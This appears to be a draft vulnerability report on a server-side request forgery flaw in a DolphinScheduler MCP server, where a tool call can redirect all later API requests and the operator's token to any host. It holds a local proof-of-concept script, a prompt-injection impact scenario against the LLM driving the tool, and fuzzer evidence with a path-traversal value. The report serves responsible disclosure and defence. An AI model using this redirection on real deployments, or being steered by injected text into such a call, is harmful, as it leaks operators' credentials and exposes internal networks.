# SSRF in `update_connection_settings`: any `api_url` becomes the target of all later API requests, token included

**Repository:** `ocean-zhc/dolphinscheduler-mcp` · **Tool:** `update_connection_settings` · **Tested commit:** `d44f0bd`
**Weakness:** CWE-918 Server-Side Request Forgery (SSRF)

## Summary
`update_connection_settings` lets the MCP caller replace the DolphinScheduler API URL and API key at runtime. The new `api_url` is stored in the process-wide `Config` singleton without any validation, and every tool called afterwards sends its HTTP request there, with the configured API token in the `Token` header. A single tool call steered by prompt injection can therefore point the server at any host and have it forward the operator's DolphinScheduler token to it.

## Details
The tool writes the caller's value straight into the shared config (`src/dolphinscheduler_mcp/tools_generated/environment_update_tools.py:54-60`):

```python
config = Config()

# Update API URL if provided
if api_url is not None:
    logger.info(f"Updating API URL to: {api_url}")
    config.api_url = api_url
    os.environ["DOLPHINSCHEDULER_API_URL"] = api_url
```

`Config` is a singleton (`src/dolphinscheduler_mcp/config.py:53-82`), and each tool builds a `DolphinSchedulerClient()` that reads it (`src/dolphinscheduler_mcp/client.py:24`). Requests then go to the stored URL with the token attached (`client.py:70-78`):

```python
url = f"{self.config.api_url.rstrip('/')}/{path.lstrip('/')}"
headers = {}
if self.config.has_api_key():
    headers["Token"] = self.config.api_key
async with session.request(method, url, params=params, json=json_data, headers=headers) as response:
```

There is no check on scheme, host, port or address range, and changing the URL does not clear the existing key. The tool is always registered (`src/dolphinscheduler_mcp/tools_generated/__init__.py:77`). The same line also logs the raw `api_url` (`:58`) to stdout, where `server.py:19-23` sends all logging.

## Steps to reproduce
1. Prerequisites: Python 3.10+ and the `mcp` Python package for the client script. No DolphinScheduler backend is needed. In one terminal, start a local listener:

   ```bash
   python3 -m http.server 8099 --bind 127.0.0.1
   ```
2. Install and start the server from a checkout (the README's `ds-mcp` entry point; `mcp.run()` defaults to stdio):

   ```bash
   git clone https://github.com/ocean-zhc/dolphinscheduler-mcp && cd dolphinscheduler-mcp
   git checkout d44f0bd
   pip install -e .
   ```
   The server writes its own log lines to stdout, so the client may print JSON parse warnings for them; they did not break our fuzzing sessions.
3. Point the server at the listener, then call any API-backed tool. The generated wrapper makes all three parameters required; `null` for `api_key` leaves the configured key unchanged.

   Arguments for the first call:
   ```json
   {"id": "", "api_url": "http://127.0.0.1:8099/tofu-poc", "api_key": null}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="ds-mcp", args=[])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("update_connection_settings", {"id": "", "api_url": "http://127.0.0.1:8099/tofu-poc", "api_key": None})
               print(result)
               result = await session.call_tool("get_ui_plugins", {"id": 1})
               print(result)

   asyncio.run(main())
   ```
4. The listener prints a request line such as `"GET /tofu-poc/ui-plugins/1 HTTP/1.1" 404 -`. The second tool result contains the 404 error from that listener.

## Expected behavior
The API endpoint is fixed by the operator (env var or CLI flag) and cannot be changed through a tool call, or a runtime change is limited to an operator-configured allow-list of hosts. The API token is never sent to a host other than the one it was configured for.

## Actual behavior
Any string is accepted and stored. From our runs, even an empty URL is taken:

```
input:  {'id': '', 'api_url': '', 'api_key': ''}
output: {'success': True, 'api_url': '', 'has_api_key': False}
```

Relative paths without a scheme and loopback URLs on non-standard ports were accepted the same way, each returning `'success': True`.

## Impact
MCP tool arguments are chosen by the LLM and can be steered by prompt injection from content it reads, such as a workflow description or a task log. One such call redirects every later request of the session to an attacker-chosen destination. That lets the server be used to reach hosts on its own network that the attacker cannot reach, and it hands the configured DolphinScheduler API token to whoever controls the destination. With that token the attacker can act on the real scheduler directly. Responses from the new host are also returned to the model, so a malicious endpoint can feed it crafted data.

## Suggested fix
Remove `update_connection_settings` from the tools exposed to the model, or gate it behind an explicit operator setting that is off by default. If runtime changes must stay, accept only `http`/`https` URLs whose host is on an operator-configured allow-list, resolve the host and reject loopback, private and link-local addresses unless they are explicitly allowed, and clear or require a new API key whenever the host changes. Escape CR/LF before logging the URL.

## Status on the default branch
The tested commit `d44f0bd` (2025-05-14) is the current head of the default branch, so the code above is unchanged.

## Prior reports
- Issues and pull requests: none related. The repository has 0 issues and 2 pull requests (fetched 2026-10-01): a file-renaming PR (#2) and a third-party badge PR (#1) whose scan mentions only `exec()` in `fastmcp_compat.py`.
- Documentation: `docs/api.md`, "Update Connection Settings": "Updates the connection settings for the DolphinScheduler API", with an example that sets a new URL and API key (the runtime URL change is documented as intended; there is no warning, allow-list or note that the existing token is sent to the new host). `CHANGELOG.md` lists "Connection management tools for dynamic configuration" for 0.1.0.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: ssrf; `check_strict_url_security_contract` on all three evidence calls; `check_introspection_log_injection` also fired (consistent with `logger.info(f"Updating API URL to: {api_url}")` at `environment_update_tools.py:58`).
- Campaigns and executions: `corpus-sbx` 2560/2560, `e2-0922` 1024/1024, 60 s budget each.
- Evidence (verbatim, trimmed): `{'id': '', 'api_url': '', 'api_key': ''}` -> `{'success': True, 'api_url': '', 'has_api_key': False}`; `{'id': '4', 'api_url': '../../../../etc/passwd', 'api_key': 'key5'}` -> `{'success': True, 'api_url': '../../../../etc/passwd', 'has_api_key': True}`; `{'id': '2', 'api_url': 'http://localhost:8080', 'api_key': 'testkey2'}` -> `{'success': True, ...}`.
- Hand-check hints: real, by-design weakness. The evidence only shows the URL being accepted; the outbound request happens on the next API-backed tool call, which the fuzzer did not chain. The two-call reproduction and the token forwarding are derived from the code (`client.py:70-78`), not observed; `"api_key": None` passing validation relies on FastMCP typing unannotated params as `Any` (checked in mcp 1.30.0 `func_metadata.py:254`). Related, not verified at runtime: `check_environment_settings` returns the raw key as `api_key_value` (`environment_check_tools.py:44`), and `config.py:44` prints env vars from a Cursor settings file, including the key, to stdout. Either may be worth a separate issue.
</details>
